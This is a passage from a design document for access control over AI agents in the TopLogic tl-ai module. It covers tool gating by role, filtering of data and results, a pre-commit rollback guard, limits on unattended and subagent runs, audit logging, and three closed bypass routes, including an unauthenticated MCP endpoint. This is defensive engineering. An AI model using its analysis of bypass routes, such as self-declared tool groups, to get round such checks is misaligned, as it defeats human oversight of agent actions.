  which costs a child run and a turn and teaches the model nothing it can tell the user. Dropping it
  instead would be worse still: it would remove a capability the user actually holds. A delegate the
  principal can use in full is not annotated at all, so the notice only ever appears where there is
  something to say.
- **A spawn that could only come back empty-handed is refused** (`SubagentSpawner.detachedSpawnRefusal`).
  `spawn_subagent` names its target at call time, so there is no list to leave it out of: the same
  predicate is applied to the name the model asked for, and the answer is an **ordinary tool error**
  rather than an exception, because what the user has to hear is which capability to ask for. Without it
  the two surfaces contradicted each other - `list_agents` is the surface that feeds the spawn decision
  and it already filters, so an agent could read a name out of a filtered listing and spawn it anyway.

  **Judged against the context the child will get, not the parent turn's.** A detached spawn is a
  background run (3.2.5), so the predicate is asked of `security().withBackgroundCeiling()`: an agent the
  parent turn reaches in full can be out of reach once the allowlist applies, and that case is refused
  with the unattended wording - *"A spawned subagent runs unattended ... it cannot reach the capabilities
  its tools require, even though this user holds them"*. Telling a user they lack a right they do hold
  would send them to their administrator for the wrong change; the split is
  `AgentCapabilities.lostToBackgroundCeiling`, the same one the capability notice uses.

  A **synchronous** delegation is untouched. It inherits the parent's context unchanged and completes
  inside the parent turn, so nothing about it is filtered here. The refusal never says or implies that
  the agent does not exist - it does, and a model told otherwise looks for another name for the same
  work. An agent that really is unknown is not refused here either: that is not a denial, and the spawn
  fails where it always did. `LEGACY` refuses nothing, and does not even walk the agent graph.
- **`loadSkill` no longer advertises tools the principal cannot call** (`SkillTool.addSkillTools`).
  It used to register and announce every resolvable tool of a skill; the next turn's schema filter
  then removed exactly the denied ones, so an authoritative tool result contradicted the tool list.
- **A `loadSkill` for a skill that is not there says which absence it is** (#281,
  `AgentCapabilities.skillAbsenceReason`, wired in `AgentFactory.absenceReason`). The same trichotomy
  as `ToolCatalog.absenceReason` above, in the same vocabulary, for the other surface the model
  discovers absence on. A skill this agent declares and the acting user may use nothing in is
  *withheld from the current user*, naming the capabilities its tools require. The same skill in an
  **unattended** run, where the `<background-allowlist>` is the ceiling that removed it
  (`SecurityContext.withheldByBackgroundCeiling` → `AgentCapabilities.lostToBackgroundCeiling`), says
  *this run is unattended* instead: the acting user's roles are not the reason and an administrator
  asked to grant a role they already granted finds nothing to do. A skill the application has and this
  agent never declared says so and names an administrator, exactly as the not-carried tool case does,
  and names no capability. An id that resolves nowhere keeps the plain "not available for this agent"
  with the loadable-skill list, so a typo still discloses nothing. Each permission case ends with the
  anti-guessing sentence the notice below carries. Before this, all four read "Skill '...' is not
  available for this agent", and an agent refused `TL_agenticAuthoring` reported the missing
  capability as `script` - to a user for whom `script` was the reason for nothing.
- **A skill's description must not point at a skill the reader cannot load** (#281). A cross-reference
  between framework skills - added deliberately, because agents used to load the wrong one - becomes a
  dead end as soon as the referenced skill is filtered for the acting user. Where the referring skill
  can simply *carry* the tool its guidance depends on, it does, and the filter then drops the pair
  together: `TL_tlScriptInstanceCreation` declares `executeTLScript` rather than telling the reader to
  load `TL_tlScriptWriting` for it. A guidance-only skill declares no tools, always survives the
  filter, and is therefore the one shape that can be offered to a user who cannot act on it. Where the
  referenced skill belongs to a different domain and carrying its tools would drop the referrer for the
  users who need it (`TL_agenticAuthoring` → `TL_tlScriptWriting`), the description says what to do
  when the reference is unreachable instead. `TestFrameworkSkillReferences` fails on a cross-reference
  that does neither.
- **A call for an absent tool says which absence it is** (`ToolCatalog.absenceReason`). A name no skill
  declares and no registry knows stays `Unknown tool` with the permitted-only available list. A name
  one of the agent's own skills declares is answered with "load that skill". A name the service
  registry resolves but the agent carries nowhere - the case of a TL-Script tool that no framework
  agent lists - says so, and says that an administrator would have to add it to the agent or to a
  skill. That last one used to read as `Unknown tool`, and an agent bridged the gap by reporting a
  capability the user happened to lack: *"This agent lacks the `agent.authoring` capability"*, to a
  user who was fully authorized. `DynamicToolCatalog.setReachableBySkill` is what separates the
  skill case from the not-carried case; it is used for the message only, never for lookup.
  A capability *is* named where the application really has the tool and the acting user really is
  denied it - that is the ordinary denial reason, not a guess. A name that resolves nowhere never goes
  through the permission check at all, so a typo still cannot make the answer disclose which
  capabilities the user lacks.
- **The generated skill catalog names the capabilities the principal lacks**
  (`AgentCapabilities.notice`), computed from the tools *this agent* can reach - its own `<tools>`
  plus its skills' - rather than from every group in the deployment. A denied capability then costs
  one short line instead of a full JSON schema, and the agent can name it to the user. Each name
  carries the group's own one-sentence description (`ToolGroups.labelKey`), because a group named
  without one invites the model to read the name and guess: `agent.authoring` was explained to a user
  as being about the data model. The section also states all three absences and tells the agent not to
  blame a capability unless the message it got names one.

  **Independent of whether the agent declares skills.** The notice is appended to the generated skill
  catalog, and that catalog used to be empty for an agent with no skills - so the one agent shape with
  nothing to load was the one shape never told which capabilities its user lacks, and (once a detached
  subagent became a background run) never told that its own run is unattended either. What an agent
  cannot do is not a property of its skills. An agent *with* skills gets the same bytes as before, and
  one with neither skills nor anything to report still gets nothing at all - no empty heading and no
  stray whitespace. This does change the system prompt of a skill-less agent under enforcement, which
  is the fix.

**This prompt text is UX, not a control**, and must not be read as closing anything: see section 2.2
- all gates in this design are deterministic Java checks on the call path, never prompt instructions.
It is emitted only where the run's mode `enforcesToolAccess()`, so a `LEGACY` prompt is byte-identical
to what it was before this existed.

#### 3.2.8 Why a tool must not declare its own group when its author is not trusted

Dropping a whole skill (3.2.7) makes the ungrouped TL-Script tool a live problem rather than a
theoretical one: under `ENFORCED` every script tool is denied to everyone, so a skill built out of
them disappears - for its author too. The obvious fix is to let the tool's configuration name its own
group. **That fix is wrong, and it is not implemented.**

A tool's group states what the tool *does*; the check asks what the *user* holds. Whoever decides the
group therefore decides which capability it costs to call the tool. `ScriptToolAuthoringTool` is
reachable with `agent.authoring` and holding that is not holding `data.write`, so a self-declared
group is a crossing of the group boundary: author a tool whose TL-Script body writes, declare it
`data.read`, and a user with only `data.read` may now write. Today's behaviour is the correct one -
an unclassified tool is denied to everyone, which is fail-closed and unforgeable.

Classification stays with the administrator, in `<tool-groups>`, where each tool is named by any of
`ToolIdentity.names()` (`RoleToolAccess.groupOf`; pinned by
`TestRoleToolAccess.testConfiguredGroupClassifiesAnUngroupedScriptTool`). The entry is a multi-valued
property whose options come from the tool registry, so the editor offers a selection of the tools that
exist.

There is deliberately **no** pattern syntax - no `{factory}.*`, no per-server catch-all. A pattern would
hand the same authority back: `createScriptTool` lets its caller choose the factory name freely, so
`reporting.*` mapped to `data.read` would let anyone who can author into `reporting` put a *writing*
tool under a capability their user holds only for *reading*. Naming tools one at a time costs a line per
tool and keeps the decision where the argument above puts it. The consequence is that a tool which
appears after the policy was written - a new Java tool, a newly authored script tool, a tool a connected
MCP server grew - is denied until an administrator names it.

### 3.3 L2 - Data authorization via `ModelAccessRights` (#29088)

#### 3.3.1 The typed façade

The dead `Object`-typed stubs (`SecurityContext.hasReadAccess/hasWriteAccess`) are replaced by a typed
façade reachable from every tool through the context it already receives:

```java
public interface ModelSecurity {

    boolean canRead(TLObject obj);
    boolean canRead(TLObject obj, TLStructuredTypePart attribute);
    boolean canWrite(TLObject obj);
    boolean canWrite(TLObject obj, TLStructuredTypePart attribute);
    boolean canDelete(TLObject obj);
    boolean canCreate(TLClass type, TLObject context);
    boolean canCreate(TLObject parent, TLStructuredTypePart compositionAttribute);
    boolean canPerform(TLObject obj, BoundCommandGroup operation);   // custom business operations

    <T extends TLObject> List<T> filterReadable(Collection<T> objects);
    Set<TLClass> accessibleTypes(BoundCommandGroup operation);

    /** Throws {@link ToolSecurityException} instead of returning false. */
    void requireRead(TLObject obj);
    void requireWrite(TLObject obj);
}
```

- Reached as `context.modelSecurity()` from `ToolExecutionContext`, so tools need no new plumbing.
- Bound to the run's `Person` at construction; no per-call `TLContext` read (see 3.1).
- Delegates straight to `ModelAccessRights.getInstance()`; it adds **no policy of its own**. This
  matters: two places deciding "may this be read" is one place too many.
- `ToolSecurityException` carries a message safe to feed back to the model (names the operation and
  type, never the withheld value) and is mapped by the dispatcher to a denied tool result plus an
  audit record.

Mapping to the engine API, as implemented in `ModelAccessRightsSecurity` against released
`8.0.0-alpha7`:

| Façade | Engine call |
|---|---|
| `canRead(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.READ)` |
| `canRead(obj, attr)` | `isAllowed(person, obj, attr, SimpleBoundCommandGroup.READ)` |
| `canWrite(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.WRITE)` |
| `canDelete(obj)` | `isAllowed(person, obj, SimpleBoundCommandGroup.DELETE)` |
| `canCreate(type, ctx)` | `isAllowedCreate(person, type, ctx)` |
| `canCreate(parent, attr)` | `isAllowedCreate(person, parent, attr)` |
| `canPerform(obj, group)` | `isAllowed(person, obj, group)` |
| `accessibleTypes(group)` | `getAccessibleTypes(person, group)` |
| `filterReadable(coll)` | `isReadAllowed(person, obj)` per element |

`filterReadable` iterates rather than calling `SearchExpression.filterSecurity(person, coll)`: that
helper is `Object`-typed and shape-preserving, so routing a `Collection<T>` through it would need an
unchecked cast to get a `List<T>` back, for no gain - the per-object check it performs is exactly
`isReadAllowed`.

In `LEGACY` mode the façade returns `true` everywhere and logs nothing (that is what `LEGACY` means).
In `SYSTEM` mode it returns `true` and increments an audit counter per distinct type touched, so
"which types did system-mode automation actually reach" is answerable without logging per object.

#### 3.3.2 Retrofitting the Java tools

The tools that need it, in dependency order:

| Tool | Change |
|---|---|
| `InstanceBrowserTool.listInstances` | Filter the instance list through `filterReadable` **before** pagination, so page sizes and `totalCount` reflect the user's view. Reporting an unfiltered `totalCount` leaks cardinality. |
| `InstanceBrowserTool.getInstance` | `requireRead(obj)`; per-attribute `canRead` when serializing values |
| `ModelSearchTool.searchModel` | TL-Script-backed - inherits engine enforcement; assert the search runs under the user (not a system context) |
| `ModelBrowserTool.*`, `TypeAnalysisTool.*` | Restrict enumeration to `accessibleTypes(READ)` (section 3.4.2) |
| `ModelEditorTool.*`, `ModelAnnotationEditorTool.*` | Structural: gated by the `model.structure` group at L1; L4 backstops the commit |
| `TLScriptTool.executeTLScript` | Already enforced by the engine inside TL-Script as of `8.0.0-alpha7`; assert user context, never a system interaction. Note this enforcement is **not** gated by `AiSecurityMode`, so it also applies in `LEGACY` - and it denies by default, see section 6 |
| `VectorIndexSearchTool` | Section 3.4.3 |
| `McpTool` (all remote tools) | Cannot be introspected and declares no group, so it is ungrouped and therefore denied until an administrator classifies it in `<tool-groups>`. Same for `ScriptToolExecutor`, i.e. every TL-Script tool authored in the running application. Classification stays with the administrator on purpose - a self-declared group would let whoever authors a tool choose which capability it costs to call (see 3.2.8) |

#### 3.3.3 Declared types - designed, not built

> **Not implemented.** A `types` member existed on `@ToolMethod` with no reader anywhere, sitting next
> to the enforced `group` on a public annotation, where it read as protection that did not exist. It is
> **removed**; this section keeps the design so that whoever implements it implements it whole -
> annotation member *and* the three uses below, in one change. Tracked as **#258**.

A `types` declaration would let a tool name the qualified model types it touches:

```java
@ToolMethod(description = "...", mode = ToolMode.READ,
            group = "data.read", types = { "myapp:Customer", "myapp:Contract" })
```

It would be **not** an enforcement mechanism - a tool can lie, and generic tools (`listInstances`,
`executeTLScript`) legitimately cannot declare anything. It buys three concrete things:

1. **Pre-flight denial with a useful reason.** If the user cannot READ any declared type, deny at L1b
   with "you have no read access to Customer" instead of returning an empty result the model then
   misinterprets as "there are no customers".
2. **Better schema filtering.** A tool whose declared types are all inaccessible is dropped from the
   provider request - the model does not waste turns on it.
3. **Reviewability.** A reviewer can see which tools claim to touch which types, and a tool whose
   declaration is empty *and* whose group is not `model.read`/`agent.meta` is a review finding.

Where declarations are absent - which today is everywhere - L2 and L4 still apply in full. Declared
types would be an optimisation and a documentation aid, never a substitute for a check, which is why
their absence costs no security.

#### 3.3.4 How RBAC and ABAC combine

```
        ┌───────────── L1 RBAC: may this PERSON use this TOOL? ─────────────┐
        │  role grants tool  AND  agent grants tool  AND  mode allows mode  │
        └───────────────────────────────┬───────────────────────────────────┘
                                        │ pass
        ┌───────────────────────────────▼───────────────────────────────────┐
        │  L2 ABAC: may this PERSON perform this OPERATION on THIS OBJECT?  │
        │  ModelAccessRights.isAllowed(person, instance, commandGroup)      │
        │  = type/module/attribute grant  AND  role held on the instance    │
        └───────────────────────────────┬───────────────────────────────────┘
                                        │ pass, per object
        ┌───────────────────────────────▼───────────────────────────────────┐
        │  L3 pre-filter results  ·  L4 re-assert before commit             │
        └───────────────────────────────────────────────────────────────────┘
```

Worked example - a clerk holding role `SalesAssistantUser` asks "list all customers and raise their
credit limit":

1. **L1** - `SalesAssistantUser` is granted `data.read`. `listInstances` passes. `executeTLScript` is in
   `script` (privileged, not granted) - denied, and the model is told so.
2. **L2** - `listInstances` calls `filterReadable`. `ModelAccessRights` finds
   `TypeAccessRule(Customer, Read) = {Viewer, Editor, Manager, SalesAssistantUser}` and evaluates the
   role *per instance*: the clerk holds `SalesAssistantUser` on their own region's customers only.
   Result: their region's customers.
3. **L3** - the filtered list is serialized; `totalCount` reports the filtered count.
4. **L4** - no write happened, nothing to guard.

The clerk sees their customers and a clear denial for the write. Neither layer alone gets this right:
RBAC alone would return every customer; ABAC alone would let the clerk run arbitrary TL-Script and
merely fail per object, leaking type structure and cardinality in the process.

### 3.4 L3 - Context and result pre-filtering

**Pre-filter, never post-hoc redact.** Once a value is in the conversation it has been streamed to the
browser, sent to the provider, and written to the transcript.

#### 3.4.1 Tool results

The dispatcher (`ToolCatalog.execute` / `ToolExecutions.execute`) applies
`SearchExpression.filterSecurity(person, value)` to any `TLObject`, collection or map a tool returns
**before serialization**. The engine's implementation recurses through collections and maps and drops
non-readable elements (verified at `SearchExpression.java:278-390`).

Limitation, stated plainly: most tl-ai tools return **already-serialized JSON strings** built by
msgbuf writers, not object graphs. `filterSecurity` cannot help there. For those tools the filter must
be applied inside the tool, before serialization - which is exactly the `filterReadable` retrofit of
section 3.3.2. The dispatcher-level filter is a **backstop for object-returning tools**, not the
primary mechanism. Claiming otherwise would be the kind of false assurance this design exists to avoid.

#### 3.4.2 The model digest

`ModelDigestGenerator.generate` is injected into the system prompt and currently enumerates every
module, type and attribute (T11). It gains a `Person`-aware overload that restricts the emitted set to
`accessibleTypes(READ)` plus the framework modules the agent needs to function.

Two caveats:
- The digest is per-run, so it can no longer be cached globally. It must be keyed by
  `(person, modelRevision)` or regenerated per run.
- Attribute-level restrictions are visible in the digest as *absence*, which is the correct behaviour
  (an attribute nobody may read should not be advertised).

#### 3.4.3 RAG / vector index (T10)

The index is populated by a background daemon under system rights, so index *contents* are
unrestricted by construction. Filtering must therefore happen **at query time**, in
`VectorIndexSearchTool`:

1. Each chunk carries the `TLObject` id of its source (an indexing-side requirement - if the id is not
   stored today, storing it is a prerequisite of this layer).
2. At query time, resolve source ids and drop chunks whose source fails `canRead`.
3. **Over-fetch and then filter**: request `k * f` candidates and truncate to `k` after filtering, so a
   user with narrow access still gets `k` results rather than two. `f` is configurable; a fixed
   multiplier is a heuristic, not a guarantee, and the tool reports when filtering exhausted the
   candidate pool.
4. Chunks whose source cannot be resolved are **dropped**, not passed through.

Embedding-level leakage (the embedding vector itself being derived from restricted text) is out of
scope; the mitigation is that the chunk text never reaches the context.

### 3.5 L4 - Pre-commit action guard · **implemented**

The highest-value layer, because it is the only one that catches tools that never had a check: MCP
tools, TL-Script tools authored at runtime, and any future Java tool whose author forgot. Every other
layer assumes the tool cooperates; this one does not.

**Where.** `AgentLoop.commitTransaction`, immediately before `scope.commit()`. There is exactly one
commit per turn, so there is exactly one place to guard.

**What.**

```java
public interface PreCommitGuard {

    /** Accepts every change. The behaviour of AiSecurityMode.LEGACY. */
    PreCommitGuard PERMISSIVE = ...;

    /** The violations found; empty means the commit may proceed. */
    List<Violation> check(SecurityContext security, ToolChangeSet changes);

    /** Whether this guard checks anything at all - asked before the change set is built. */
    default boolean enforces() { return true; }

    /** PERMISSIVE unless the run's mode enforces model access. */
    static PreCommitGuard forRun(SecurityContext security) { ... }

    record Violation(TLObject object, String typeName, BoundCommandGroup operation, String reason) {}
}
```

`ModelSecurityPreCommitGuard` is the implementation. It adds **no policy of its own**: every question
goes to the run's `ModelSecurity`, hence to the engine's `ModelAccessRights`, so a tool that bypassed
its own check ends up bounded by exactly the rights the acting user would have had in the UI.

**Where the change set comes from.** `TransactionScope.changes()` reads the engine's own transaction
bookkeeping - `DefaultDBContext.getNewObjects()` / `getChangedObjects()` / `getDroppedObjects()`, plus
the per-item `ChangeInspectable.getChange()` record the engine also uses to build its commit event.
Nothing asks a tool what it wrote: a tool that forgot to check would equally forget to report. Only
attribute *names* are read from the change record, never values.

| Change | Check |
|---|---|
| created | `canCreate(type, container)`, and `canCreate(parent, compositionAttr)` when created into a composition |
| updated | `canWrite(obj)` and `canWrite(obj, attr)` for every touched attribute |
| deleted | `canDelete(obj)` |

**On violation:** the whole turn is rolled back through `AgentLoop.rollbackTurn` - the *same* route a
failed tool call takes, so all-or-nothing means the same thing in both cases - one audit record per
violation is written by the guard, and the model is given a framework notice naming the operation and
the type but **not** the values:

> `[Framework notice] The data changes of this turn were rolled back and NOT persisted, because your
> account is not permitted to make all of them: you attempted 'Create on objects of type
> 'myapp:Contract'' for 3 objects without permission. The rollback is all-or-nothing, so the permitted
> changes of this turn are gone as well. ...`

**The checks run in the committed view** (`KnowledgeBase.withoutModifications`), forced by the engine
in two ways. An object deleted in the current transaction refuses attribute access, and
`ModelAccessRights` has to read its type and its security parent to decide - in the committed view the
object is visible again, which is where its DELETE right is meaningful anyway. And an object created in
the current transaction is allowed everything by construction, so asking about it would answer nothing.

**Ordering caveat, verified against the engine.** `ModelAccessRights.isAllowed` returns `true` for
objects that are not yet committed (`SecurityConfigurationService.isCommitted`), because rule-derived
roles are computed at commit time. So the guard **cannot** validate a freshly created object's *own*
instance-level rights - by construction those do not exist yet. What it validates for creations is
condition 1 + condition 2 of spec 2.3.6 (CREATE on the type in the committed parent context, WRITE on
the composition attribute of the committed parent), which is precisely the check the engine itself
performs. A parent created in the same turn is equally unvalidatable and is covered by *its* creation
being checked against *its* container, up to the first committed ancestor. Updates and deletes of
pre-existing objects are checked fully. This is a real limit of the layer and is stated rather than
papered over.

**What the layer does not cover.**

- Attribute writes to an object created in the same turn. Booked by the engine as part of the creation,
  and unvalidatable per the caveat above. The creation itself is checked.
- Change-set items that carry no application type - the link items of a multi-valued reference, and the
  engine's own bookkeeping items. Not a silent hole: the object at the writing end of such a link is
  itself booked as changed, so the write is checked through that object. A storage-level attribute that
  maps to no model attribute likewise costs attribute granularity, not the check - the object-level
  right is always asked as well.
- Side effects outside the KnowledgeBase. A tool that wrote a file, sent a mail or called an HTTP
  endpoint is not rolled back by a KB rollback. That is L1's business (`egress`) and the approval
  prompt's, not this layer's.
- A `LEGACY` or `SYSTEM` run. Neither enforces model access, so `forRun` hands back `PERMISSIVE` and no
  change set is read at all.

**Cost.** One `ModelAccessRights` call per touched object and per touched attribute, once per turn,
plus one pass over the transaction's own change lists. Turns that write nothing - the overwhelming
majority - skip the guard entirely, because `scope.isActive()` is false: no transaction was ever begun,
since `ensureTransaction` only begins one for non-READ tools. A turn that *does* write pays this in
addition to whatever the tools already paid; the guard is deliberately not the place to economise.

**Tested by** `TestPreCommitGuard` and the transaction cases of `TestAgentLoop` in `tl-ai-core`, and
`SecDemoPreCommitGuardTest` against a real fixture boot - see
[testbed.md](testbed.md#47-the-pre-commit-guard---what-catches-an-uncooperative-tool).

### 3.6 L5 - Output / reference guard

Scoped narrowly and deliberately.

**In scope:** deterministic validation of *structured object references* the agent emits - `TLID`s,
`toplogic://instance/{tid}` URIs, deep links, and the object references embedded in tool results the
UI renders as links. Each is resolved and checked with `canRead`; a reference that fails is removed and
replaced with a neutral placeholder.

**Out of scope:** scanning free-form answer text for "secrets". The data has already been streamed by
the time a full answer exists (`ChatSSEHandler` pushes `text_delta` frames live), so a post-hoc scan
protects nothing and creates a false sense of assurance. If a value must not appear in an answer, it
must not have reached the context - that is L2 and L3.

The residual risk is explicit: an agent that legitimately read an object (L2 passed) can paraphrase it
in prose, and prose is not checked. That is inherent to the product.

### 3.7 The three bypass routes, closed

| Route | Today | Design |
|---|---|---|
| **MCP server** (`McpToolAdapter.java:120`, `ToolExecutions.execute(t, a, null)`) | Unauthenticated `/mcp/*`, `null` context, system interaction, engine super-user bypass | (1) `/mcp/*` requires authentication and resolves to a `Person` (a `security-constraint` or an authentication filter in `web-fragment.xml`, plus token-to-`Person` mapping). (2) The adapter builds a real `ToolContext` for that `Person` and runs the tool inside their sub-session. (3) With no resolvable `Person`, in `ENFORCED` the call is **refused**, not downgraded to system. (4) The adapted tool set is filtered by the same `ToolPermissionFilter` as the chat path - one policy, two front ends. |
| **`createUnrestricted()`** (`AIScriptFunctions.java:183`, `:289`, `:343`) | Silent full bypass | Renamed to `createSystemContext(reason)`; prefers the caller's `Person` when one is bound; audited; capped by the global ceiling |
| **`ToolContext.EMPTY`** (`ToolContext.java:31`, used at `AgentFactory.java:119`, `AgentLoop.java:347`) | Full bypass reachable from production code | Renamed `forTesting()`, asserts non-deployed; the two production call sites take an explicit system context |

The MCP change is the one with real external impact: existing external clients (Claude Desktop,
Cursor) will need credentials. That is the point - an unauthenticated endpoint that executes
`deleteModelElement` under super-user rights is the single largest exposure in the current system.

### 3.8 L6 - Audit

One structured event type, `AgentEvent.SecurityAudit`, alongside the existing 25 agent events, carrying
`(runId, turn, timestamp, person, tool, decision, reason, mode)`. Recorded for:

| Occasion | Why |
|---|---|
| Every `SYSTEM`-mode context creation, with its reason | Bypasses must be countable |
| Every RBAC denial (L1) | Detects both misconfiguration and probing |
| Every `ToolSecurityException` (L2) | The tool asked and was told no |
| Every pre-commit rollback, one record per violation (L4) · **implemented as a log line** | The highest-signal event in the system - it means a tool tried to write without authority. `ModelSecurityPreCommitGuard` writes one `ERROR` per violation, in the field shape of a `ToolAuthorization` denial. What is still missing is the structured `AgentEvent.SecurityAudit` and the `ConversationLog` entry |
| Every reference stripped (L5) | Low volume, high signal |
| Every `egress` call correlated with a restricted `data.read` in the same turn (3.2.4) | Exfiltration detection |
| Every effective-mode resolution at run start | Answers "under what policy did this run execute" |

Denials are logged at `WARN` and rollback violations at `ERROR`. Both should also go to the
`ConversationLog`, so the audit trail lives with the transcript that produced it - that part is **not
built** for either layer; today both write to the application log only. **Audit records never contain
withheld values** - type names and operations only.

---

## 4. The administrator's configuration

### 4.1 `AiToolAccessService` · **implemented**

A `ConfiguredManagedClass` holding the role-to-tool policy, deliberately shaped like
`SecurityConfigurationService` (#29088) so administrators meet one idiom, not two. Its configuration
interface is `ToolAccessPolicy` (scaffolded on this branch), which the service's own
`ConfiguredManagedClass.Config` extends:

```xml
<config service-class="com.top_logic.tl.ai.core.security.AiToolAccessService">
    <!-- security-mode is the deployment-wide mode; every run of this application carries it. -->
    <instance security-mode="ENFORCED">

        <!-- Group membership is declared on the tool (@ToolMethod(group=...)).
             This section only *overrides* it, or assigns a group to tools that
             cannot be annotated (MCP tools, TL-Script tools authored at runtime). -->
        <tool-groups>
            <group name="egress"
                tools="mcp__jira__createIssue, mcp__jira__addComment"
            />
            <group name="data.read"
                tools="script-tools.findOverdueInvoices"
            />
        </tool-groups>

        <!-- The role x tool matrix. Deny-by-default: a role with no entry gets nothing. -->
        <tool-access>
            <role name="SalesAssistantUser">
                <grants>
                    <grant group="model.read"/>
                    <grant group="data.read"/>
                    <grant group="agent.meta"/>
                    <grant tools="task-tools.createTask"/>
                </grants>
                <denies>
                    <deny group="model.structure"/>
                    <deny group="script"/>
                </denies>
            </role>

            <role name="SalesManager">
                <grants>
                    <grant group="model.read"/>
                    <grant group="data.read"/>
                    <grant group="data.write"/>
                    <grant group="workspace"/>
                    <grant group="egress"/>
                </grants>
                <denies>
                    <deny group="model.structure"/>
                </denies>
            </role>

            <!-- Every group is reached only by a grant naming it, this one included. -->
            <role name="ApplicationDeveloper">
                <grants>
                    <grant group="model.read"/>
                    <grant group="model.structure"/>
                    <grant group="script"/>
                    <grant group="agent.authoring"/>
                </grants>
            </role>
        </tool-access>

        <!-- Granted to every authenticated user, on top of their role grants. "interaction" is
             granted implicitly and needs no entry here - it is spelled out in this example only
             to show the element, and writing it changes nothing. -->
        <baseline>
            <grant group="interaction"/>
        </baseline>

        <!-- Ceiling for runs with no human to approve (agentChatAsync, scheduler, MCP).
             Mandatory once enforcement is on; write all="true" to opt out of it explicitly,
             or leave it empty to forbid unattended runs every tool. -->
        <background-allowlist>
            <grant group="model.read"/>
            <grant group="data.read"/>
            <grant group="agent.meta"/>
        </background-allowlist>
    </instance>
</config>
```

This is the XML the scaffolded `ToolAccessPolicy` actually produces - the `<grants>`/`<denies>` and
`<tools>` wrappers come from the typed-configuration list and map properties, not from stylistic
choice.

Semantics, stated precisely:

| Rule | Behaviour |
|---|---|
| No `<role>` entry for any role the user holds | All tools denied (baseline only) |
| `interaction` | Granted to every role and every run implicitly, whatever `<baseline>` says; a `<deny>` still wins |
| Multiple held roles | Grants **union**; then denies subtract |
| `<deny>` anywhere among the held roles | Wins over any `<grant>`, from any role |
| A tool with no group and no `<grant tools>` naming it | Denied |
| `<grant tools="a, b">` | Grants exactly the named tools, matched against any of `ToolIdentity.names()`. No pattern syntax: a tool the policy does not name is denied |
| An entry naming a group and tools at once, or neither | Boot-time `context.error(...)` - it would otherwise look like a grant and be none |
| Roles referenced must exist | Boot-time `context.error(...)`, same as `SecurityConfigurationService.processRights` does for unknown roles - a typo must not silently widen or narrow access |

Note this is **static application configuration**, consistent with #29088's own choice
(spec 2.4.1: "loaded at startup and a change requires editing the configuration"). Section 4.3
describes the runtime-editable successor.

#### Decided while implementing this section

Four points the table above leaves open, resolved as follows. Each is a deliberate reading, not an
accident.

| Question | Decision | Why |
|---|---|---|
| When exactly does enforcement turn on? | An explicit `security-mode` always wins. Without one, a **non-empty `<tool-access>`** resolves to `ENFORCED` and an empty one to `LEGACY`. | Phase 3 says "an application enables it by writing `<tool-access>`", so writing the matrix has to be sufficient - requiring a second `security-mode="ENFORCED"` would make a written policy silently inert, the failure mode this layer must not have. It also matches 3.1's rule that the presence of a policy is the opt-in signal. Note this needed `@NullDefault` on the property: an enum configuration property otherwise defaults to its first constant, so "not configured" and "`LEGACY`" would be indistinguishable. |
| A `<grant group="...">` naming a group no tool is in | Boot **warning**, not error, listing the unknown names and the known ones | Unlike roles, group names are an open string space by design - applications, MCP servers and TL-Script tools authored in the running application contribute their own, and one can appear after boot. A group nobody claims *at boot* is therefore not proof of a typo. It is still said out loud, because a grant of a misspelled group reaches nothing. |
| Does the `<background-allowlist>` apply to administrators? | **Yes** | Its justification is the missing approval prompt, not the principal's authority: an unattended administrator run has nobody to ask either. An administrator who needs a write tool in a scheduled run says so by putting its group on the allowlist - which is the "explicit administrative decision" 3.2.5 asks for. |
| What if the `<background-allowlist>` is missing? | **Boot error** naming the three things that can be said instead | It is the only control that stands in for the approval prompt an unattended run cannot show, so its absent state must not be the permissive one. See 3.2.5. |
| What if it is present but empty? | Unattended runs reach **nothing** | A legitimate and stricter answer, and distinguishable from silence - which is exactly why silence has to be rejected rather than interpreted. |
| Does it apply to a sub-agent? | **To a detached one, yes; to a synchronous delegation, no** | The question is only ever whether somebody is there to answer an approval prompt. A synchronous delegation completes inside the parent turn, where that human still is; `spawn_subagent` is fire-and-forget, so the parent turn ends and the child works on with nobody to ask. See 3.2.5 - and note the accepted consequence: a detached child loses tools its parent could use, and says so in its own prompt. |
| Where do the group constants live? | `tl-ai-tool-api`, not next to the policy | A tool declares its group on `@ToolMethod`, so the legal values must be nameable from every module that can define a tool. `tl-ai-vector-index` depends on `tl-ai-tool-api` alone and could not otherwise classify `searchVectorIndex`. |

One implementation consequence worth stating, because it is invisible in the XML: a tool has **three**
names - the bare `Tool.name()` the model calls, the configured `{factory}.{tool}` name an administrator
writes, and the provider-safe `factory__tool` form the registry keys it by. A `<grant tools="...">`
entry matches any of them. Matching only the registry's form (the first implementation) made a correctly
spelled dot-notation grant reach nothing at all.

### 4.2 Interaction with the per-agent tool list

The tool list is unchanged from today's `AgentDefinition.tools()`; the role policy is an additional,
independent filter. The per-agent security mode of section 3.1 is **built** (#260); `required-groups`
below is still a proposal.

```xml
<agent name="sales-assistant">
    <tools>
        <tool name="instance-browser.listInstances"/>
        <tool name="instance-browser.getInstance"/>
        <tool name="model-search.searchModel"/>
    </tools>
    <!-- Floor: this agent is never laxer than ENFORCED, whatever the deployment mode. -->
    <security-mode>ENFORCED</security-mode>
    <!-- NOT BUILT. Optional: additionally narrow this agent below what the user's roles allow. -->
    <required-groups>
        <group name="data.read"/>
    </required-groups>
</agent>
```

The property is named `security-mode`, not `security-mode-floor` as an earlier draft of this section
proposed: it is the same setting an administrator already knows from the deployment policy, and
spelling the composition rule into the name buys less than having one name for one concept. That the
value can only tighten is said in its tooltip, in 3.1, and in the resource an administrator reads.

Both layers carry it, because both are places an agent definition is expressed:

| Layer | Where | How |
|---|---|---|
| Framework agents | the `TopLogicAgentDefinitions` service XML | `<agent security-mode="ENFORCED">`, edited in *Service Editor → TopLogic Agents and Skills* |
| Application agents | the knowledge base | the `securityMode` attribute of `tl.ai.core:Agent`, edited in the *Agent Editor* |

Both are optional and both distinguish "not set" from an explicit `LEGACY` - `@Nullable` plus
`@NullDefault` on the configuration property, a non-mandatory attribute in the model. An enum
configuration property otherwise defaults to its first constant, which would make "the author of this
agent said nothing" indistinguishable from "this author chose the laxest mode".

`required-groups` is a self-imposed narrowing: the agent declares it needs nothing beyond these
groups, so even a user with broad roles gets only these tools through *this* agent. It shrinks blast
radius for prompt injection (T3) - an injected instruction inside a customer record cannot reach a
tool the agent never carried.

### 4.3 Administration UI concept · **not built**

**Location:** `Administration > Security > AI Tool Access`, next to the existing role and group
administration, because the audience is the person who already administers roles.

